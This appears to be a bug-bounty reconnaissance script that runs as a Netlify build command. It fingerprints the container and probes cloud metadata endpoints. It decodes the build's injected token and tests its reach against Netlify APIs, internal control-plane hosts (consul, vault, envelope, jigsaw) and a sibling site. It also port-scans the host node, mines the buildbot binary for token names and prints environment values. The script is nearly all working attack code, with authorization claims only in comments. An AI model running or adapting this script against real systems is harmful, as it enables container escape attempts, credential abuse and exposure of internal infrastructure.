#!/usr/bin/env bash
# ============================================================================
# Netlify build-container recon payload  --  runs AS THE BUILD COMMAND
# Netlify H1 program, authorized. Testing only against a site I own.
#
# RoE anchor: program policy puts "general RCE in your site builds" out of scope
# BUT carves back in: root escalation / secrets not already accessible to your
# user / container escape / access to the orchestration control plane.
# This script measures exactly those four and nothing else.
#
# DISCIPLINE:
#  - read-only. no writes to any Netlify infra, no exploitation, no brute force.
#  - every internal host probed is on an IN-SCOPE wildcard (see targets-inscope.txt).
#  - short timeouts, sequential, single request per target -> no load concern.
#  - fabricated controls included so "unreachable" is distinguishable from "blocked".
#  - the ONLY secrets printed are this site's own; token VALUES are hashed, never echoed.
# ============================================================================
set +e
echo "=================== NETLIFY BUILD RECON =================================="
echo "date_utc=$(date -u +%FT%TZ)  ctx=${CONTEXT:-?}  site=${SITE_NAME:-?}  deploy=${DEPLOY_ID:-?}"

hr () { echo; echo "----- $* -----"; }

# --------------------------------------------------------------- A4: identity / root
hr "A4  identity, privileges, container shape"
id
echo "whoami=$(whoami)  home=$HOME  pwd=$(pwd)"
echo "kernel=$(uname -a)"
echo "CapEff=$(grep -E '^Cap(Eff|Prm|Bnd)' /proc/self/status | tr '\n' ' ')"
echo "NoNewPrivs=$(grep -E '^NoNewPrivs|^Seccomp' /proc/self/status | tr '\n' ' ')"
echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
echo "cgroup:"; head -5 /proc/self/cgroup 2>/dev/null
echo "sudo -n -l:"; timeout 5 sudo -n -l 2>&1 | head -5
echo "writable docker socket: $([ -w /var/run/docker.sock ] && echo YES || echo no)"
echo "setuid binaries outside /usr/bin:"; timeout 25 find / -xdev -perm -4000 -type f 2>/dev/null | grep -v '^/usr/bin' | head -20

hr "A4b  mounts (looking for host paths / shared volumes)"
cat /proc/mounts 2>/dev/null | grep -vE '^(proc|sysfs|tmpfs|devpts|cgroup|mqueue|shm) ' | head -30

# --------------------------------------------------------- A1: the injected token
hr "A1  build-injected credential (values HASHED, never printed)"
# blobs.ts:40-49 -> NETLIFY_BLOBS_CONTEXT = base64({apiURL,deployID,siteID,token})
if [ -n "$NETLIFY_BLOBS_CONTEXT" ]; then
  echo "NETLIFY_BLOBS_CONTEXT present, len=${#NETLIFY_BLOBS_CONTEXT}"
  echo "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null \
    | python3 -c 'import sys,json,hashlib
d=json.load(sys.stdin)
for k,v in d.items():
    if k.lower()=="token":
        print(f"  token: len={len(v)} prefix={v[:4]}... sha256={hashlib.sha256(v.encode()).hexdigest()[:16]}")
    else:
        print(f"  {k}: {v}")' 2>/dev/null
else
  echo "NETLIFY_BLOBS_CONTEXT ABSENT"
fi
for v in NETLIFY_AUTH_TOKEN NETLIFY_API_TOKEN NETLIFY_SKEW_PROTECTION_TOKEN NPM_TOKEN; do
  eval "val=\$$v"
  [ -n "$val" ] && echo "$v present len=${#val} sha256=$(printf %s "$val" | sha256sum | cut -c1-16)"
done

hr "A1b  parent process cmdline/env (does buildbot pass --token on argv?)"
for p in $PPID 1; do
  echo "  pid $p cmdline: $(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | sed -E 's/(--token[= ]|Bearer )[A-Za-z0-9._-]+/\1<REDACTED>/g' | head -c 400)"
done
echo "  processes:"; ps -eo pid,ppid,user,args 2>/dev/null | sed -E 's/(--token[= ]|Bearer )[A-Za-z0-9._-]+/\1<REDACTED>/g' | head -25
echo "  env var NAMES visible to build (values withheld):"
env | cut -d= -f1 | sort | tr '\n' ' '; echo

# ------------------------------------------------------------- A3: cloud metadata
hr "A3  cloud metadata reachability"
mdt () { printf "  %-46s -> " "$1"; timeout 4 curl -s -o /dev/null -w '%{http_code}\n' "$2" ${3:+-H "$3"} 2>/dev/null || echo TIMEOUT; }
mdt "AWS IMDSv1 /latest/meta-data/"        "http://169.254.169.254/latest/meta-data/"
printf "  %-46s -> " "AWS IMDSv2 PUT /latest/api/token"
timeout 4 curl -s -o /dev/null -w '%{http_code}\n' -X PUT "http://169.254.169.254/latest/api/token" -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null || echo TIMEOUT
mdt "ECS task role 169.254.170.2"          "http://169.254.170.2/v2/credentials/"
mdt "GCP metadata.google.internal"         "http://metadata.google.internal/computeMetadata/v1/" "Metadata-Flavor: Google"
mdt "Azure IMDS"                           "http://169.254.169.254/metadata/instance?api-version=2021-02-01" "Metadata: true"

# ------------------------------------------- A2: orchestration control plane reach
hr "A2  network position -- DNS + TCP reach to IN-SCOPE control plane"
echo "  resolv.conf:"; grep -E '^(nameserver|search)' /etc/resolv.conf 2>/dev/null | head -6
echo "  routes:";      (ip route 2>/dev/null || route -n 2>/dev/null) | head -6
echo "  addrs:";       (ip -4 -o addr 2>/dev/null || ifconfig 2>/dev/null | grep inet) | head -6

reach () { # host port label
  printf "  %-50s :%-5s " "$1" "$2"
  ipa=$(getent ahostsv4 "$1" 2>/dev/null | awk '{print $1}' | head -1)
  if [ -z "$ipa" ]; then echo "NXDOMAIN"; return; fi
  if timeout 4 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null; then
    echo "$ipa  OPEN"
  else
    echo "$ipa  closed/filtered"
  fi
}
# T1 orchestration control plane (in scope: *.infra-prod.nsvcs.net)
reach consul.infra-prod.nsvcs.net      8500   # consul HTTP API
reach consul.infra-prod.nsvcs.net      8501   # consul HTTPS API
reach consul-api.infra-prod.nsvcs.net  443
reach vault-releng.infra-prod.nsvcs.net 8200
reach vault-releng.infra-prod.nsvcs.net 443
reach awx.infra-prod.nsvcs.net         443
reach shepherd.infra-prod.nsvcs.net    443
reach argocd.infra-prod.nsvcs.net      443
# T2 secret / config services (in scope: *.services-prod.nsvcs.net)
reach envelope.services-prod.nsvcs.net 443
reach envelope.services-prod.nsvcs.net 80
reach jigsaw.services-prod.nsvcs.net   443
# fabricated controls -- MUST stay dead. if these read OPEN the whole table is void.
reach zzz-cherry-control.infra-prod.nsvcs.net    443
reach zzz-cherry-control.services-prod.nsvcs.net 443

hr "A2b  if consul/envelope answered, what do they say? (read-only, no KV writes)"
for u in "http://consul.infra-prod.nsvcs.net:8500/v1/status/leader" \
         "http://consul.infra-prod.nsvcs.net:8500/v1/catalog/services" \
         "https://envelope.services-prod.nsvcs.net/" ; do
  printf "  %-62s -> " "$u"
  timeout 6 curl -sk -o /tmp/cp.out -w '%{http_code} ' "$u" 2>/dev/null || printf 'TIMEOUT '
  head -c 200 /tmp/cp.out 2>/dev/null | tr -d '\n'; echo
done

# --------------------------------------------------------------- A6: shared cache
hr "A6  build cache -- is it per-site?"
ls -la /opt/buildhome/ 2>/dev/null | head -20
echo "  cache dir:"; ls -la /opt/buildhome/cache 2>/dev/null | head -15
echo "  any other uid's files under /opt?"; find /opt -xdev -maxdepth 3 ! -user "$(whoami)" 2>/dev/null | head -15

echo
echo "=================== END RECON ==========================================="

# ============================================================================
# PART 2 -- authority, not execution.
# RCE here is the product. The question is what this build's own credential
# reaches that the isolation promise says it cannot.
# Sibling site ids are BOTH MINE, same account -- this measures enforcement
# GRANULARITY (per-site vs per-account), which decides whether a cross-tenant
# test is even worth setting up.
# ============================================================================
SITE_A=c2283052-f0fc-40fe-b813-0d4527661baa   # incredible-cobbler-ff0c1a
SITE_B=62b5ca3e-8f63-4281-b766-e5649e789df8   # cherry-lane2-beta
SITE_C=94b96efc-4aa2-4eca-bf2b-ec151107fdc2   # cherry-lane2-alpha (no repo)
case "$SITE_ID" in
  "$SITE_A") SIBLING=$SITE_B ;;
  *)         SIBLING=$SITE_A ;;
esac
JG=https://jigsaw.services-prod.nsvcs.net

hr "B0  is this deploy TRUSTED or UNTRUSTED?"
echo "  CONTEXT=$CONTEXT  PULL_REQUEST=${PULL_REQUEST:-unset}  REVIEW_ID=${REVIEW_ID:-unset}"
echo "  BRANCH=$BRANCH  HEAD=${HEAD:-unset}  REPOSITORY_URL=${REPOSITORY_URL:-unset}"
echo "  SITE_ID=$SITE_ID  ACCOUNT_ID=${ACCOUNT_ID:-unset}  SIBLING=$SIBLING"

hr "B0b  canaries: which env values reached THIS build?"
echo "  CHERRY_PLAIN  = ${CHERRY_PLAIN:-<absent>}"
echo "  CHERRY_SECRET = ${CHERRY_SECRET:+<present>}${CHERRY_SECRET:-<absent>}"

hr "B1  extract this build's own token"
BT=$(printf %s "$NETLIFY_BLOBS_CONTEXT" | base64 -d 2>/dev/null \
     | python3 -c 'import sys,json;print(json.load(sys.stdin).get("token",""))' 2>/dev/null)
if [ -z "$BT" ]; then echo "  NETLIFY_BLOBS_CONTEXT carries no token"; else
  echo "  len=${#BT} prefix=${BT:0:4} sha256=$(printf %s "$BT" | sha256sum | cut -c1-16)"; fi

probe () { # host label path [auth header value]
  printf "  %-50s -> " "$2"
  timeout 12 curl -sk -o /tmp/p.out -w '%{http_code} ' "$1$3" ${4:+-H "Authorization: Bearer $4"} 2>/dev/null || printf 'ERR '
  head -c 240 /tmp/p.out 2>/dev/null | tr -d '\n'; echo
}

hr "B2  build token vs api.netlify.com -- WHAT IS ITS SCOPE?"
A=https://api.netlify.com
probe $A "/user"                          "/api/v1/user"                      "$BT"
probe $A "/sites          (all? or one?)" "/api/v1/sites"                     "$BT"
probe $A "/sites/{THIS}"                  "/api/v1/sites/$SITE_ID"            "$BT"
probe $A "/sites/{SIBLING}  <-- the test" "/api/v1/sites/$SIBLING"            "$BT"
probe $A "/accounts/{acct}/env"           "/api/v1/accounts/$ACCOUNT_ID/env"  "$BT"

hr "B3  will Jigsaw mint an extension_token for the build token?"
timeout 12 curl -sk -o /tmp/j.out -w '  mint: %{http_code}\n' \
  "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SITE_ID" \
  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null || echo "  mint: ERR"
python3 - </tmp/j.out <<'PY' 2>/dev/null || echo "  (unparsable)"
import sys,json,base64
try: d=json.load(sys.stdin)
except Exception: raise SystemExit
for e in (d if isinstance(d,list) else []):
    t=e.get("extension_token") or ""
    if not t: print(f"    {e.get('slug')}: extension_token EMPTY"); continue
    p=t.split(".")[1]; p+="="*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
    print(f"    {e.get('slug')}: owner_id={c.get('owner_id')} scopes={c.get('authorized_scopes')}")
    open("/tmp/ET","w").write(t)
PY
echo "  ALSO: try minting for the SIBLING site id with this build's token"
timeout 12 curl -sk -o /tmp/j2.out -w '  mint(sibling): %{http_code} ' \
  "$JG/team/$ACCOUNT_ID/integrations/installations/meta/$SIBLING" \
  -H "Netlify-SDK-Build-Bot-Token: $BT" 2>/dev/null; head -c 160 /tmp/j2.out | tr -d '\n'; echo

hr "B4  extension_token vs the Jigsaw /api/v1 proxy -- ENFORCEMENT GRANULARITY"
if [ -s /tmp/ET ]; then
  ET=$(cat /tmp/ET)
  probe $JG "/api/v1/user"                   "/api/v1/user"                       "$ET"
  probe $JG "/api/v1/sites"                  "/api/v1/sites"                      "$ET"
  probe $JG "/api/v1/sites/{THIS}"           "/api/v1/sites/$SITE_ID"             "$ET"
  probe $JG "/api/v1/sites/{SIBLING} <- key" "/api/v1/sites/$SIBLING"             "$ET"
  probe $JG "/api/v1/accounts/{acct}/env"    "/api/v1/accounts/$ACCOUNT_ID/env"   "$ET"
  probe $JG "/api/v1/accounts/{slug}/env"    "/api/v1/accounts/cherry-bisht/env"  "$ET"
else echo "  no extension token -- skipped"; fi

hr "B5  ENVELOPE -- does the env-var service trust network position?"
# envelope.services-prod.nsvcs.net -> 10.64.130.84 in PUBLIC dns, unreachable from
# the internet. In scope, critical. If it answers here, reachability IS the finding:
# read only THIS site's own variables, then stop.
EV=https://envelope.services-prod.nsvcs.net
echo "  dns: $(getent ahostsv4 envelope.services-prod.nsvcs.net 2>/dev/null | awk '{print $1}' | head -1)"
for p in "/" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID" "/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID"; do
  printf "  %-50s -> " "unauth $p"
  timeout 8 curl -sk -o /tmp/ev.out -w '%{http_code} ' "$EV$p" 2>/dev/null || printf 'TIMEOUT '
  head -c 200 /tmp/ev.out 2>/dev/null | tr -d '\n'; echo
done
[ -n "$BT" ] && probe $EV "with build token: /accounts/{acct}/env" "/api/v1/accounts/$ACCOUNT_ID/env?site_id=$SITE_ID" "$BT"

echo
echo "=================== END RECON ==========================================="

# ============================================================================
# PART 3 -- the three things still unmeasured:
#   the skew-protection token, HOST_NODE_IP, and the buildbot orchestrator binary
# ============================================================================
hr "C1  NETLIFY_SKEW_PROTECTION_TOKEN -- what does it authenticate?"
SK="$NETLIFY_SKEW_PROTECTION_TOKEN"
echo "  len=${#SK} sha256=$(printf %s "$SK" | sha256sum | cut -c1-16)"
case "$SK" in
  *.*.*) echo "  looks like a JWT -- claims:"
     python3 -c '
import sys,base64,json
t="""'"$SK"'""".strip()
for n,seg in zip(("header","payload"),t.split(".")[:2]):
    seg+="="*(-len(seg)%4)
    try: print("   ",n,json.dumps(json.loads(base64.urlsafe_b64decode(seg))))
    except Exception as e: print("   ",n,"undecodable",e)' ;;
  *) echo "  not a JWT; first 6 chars=${SK:0:6}" ;;
esac
for tgt in "https://api.netlify.com/api/v1/user" "https://api.netlify.com/api/v1/sites" \
           "https://jigsaw.services-prod.nsvcs.net/api/v1/user"; do
  printf "  bearer-> %-52s " "${tgt#https://}"
  timeout 10 curl -sk -o /tmp/sk.out -w '%{http_code} ' "$tgt" -H "Authorization: Bearer $SK" 2>/dev/null || printf 'ERR '
  head -c 90 /tmp/sk.out | tr -d '\n'; echo
done

hr "C2  HOST_NODE_IP -- what is the build VM's host, and what listens on it?"
echo "  HOST_NODE_IP=${HOST_NODE_IP:-unset}"
echo "  resolver=$(grep -m1 nameserver /etc/resolv.conf 2>/dev/null)"
if [ -n "$HOST_NODE_IP" ]; then
  for p in 22 80 443 4646 4647 4648 8500 8501 8600 9998 9999; do
    printf "  %s:%-5s " "$HOST_NODE_IP" "$p"
    timeout 3 bash -c "cat </dev/null >/dev/tcp/$HOST_NODE_IP/$p" 2>/dev/null && echo OPEN || echo closed
  done
  printf "  http://%s/ -> " "$HOST_NODE_IP"
  timeout 5 curl -s -o /tmp/h.out -w '%{http_code} ' "http://$HOST_NODE_IP/" 2>/dev/null || printf 'TIMEOUT '
  head -c 120 /tmp/h.out 2>/dev/null | tr -d '\n'; echo
fi

hr "C3  /opt/build-bin -- is the orchestrator readable?"
ls -la /opt/build-bin/ 2>/dev/null
for f in /opt/build-bin/buildbot /opt/build-bin/build /opt/build-bin/entrypoint /opt/build-bin/dev-server; do
  [ -r "$f" ] && echo "  READABLE $f  $(stat -c%s "$f" 2>/dev/null) bytes  sha256=$(sha256sum "$f" 2>/dev/null | cut -c1-16)" \
               || echo "  not readable: $f"
done
if [ -r /opt/build-bin/buildbot ]; then
  hr "C3b  internal hostnames + endpoints inside the buildbot binary"
  strings -n 8 /opt/build-bin/buildbot 2>/dev/null \
    | grep -oE '([a-z0-9.-]+\.(nsvcs\.net|netlify\.com|netlifysdk\.com))|(https?://[a-zA-Z0-9./_:-]{6,80})' \
    | sort -u | head -60
  hr "C3c  auth-header / token names the orchestrator knows about"
  strings -n 6 /opt/build-bin/buildbot 2>/dev/null \
    | grep -iE '^[A-Za-z-]*(token|secret|authorization|bearer|credential|jwt)[A-Za-z-]*$' \
    | sort -u | head -40
fi

hr "C4  full env VALUES (my own site, no customer data)"
env | sed -E 's/^(NETLIFY_SKEW_PROTECTION_TOKEN|BUGSNAG_KEY_BUILD_INFO)=(.{8}).*/\1=\2<TRUNCATED>/' | sort

echo
echo "=================== END PART 3 =========================================="
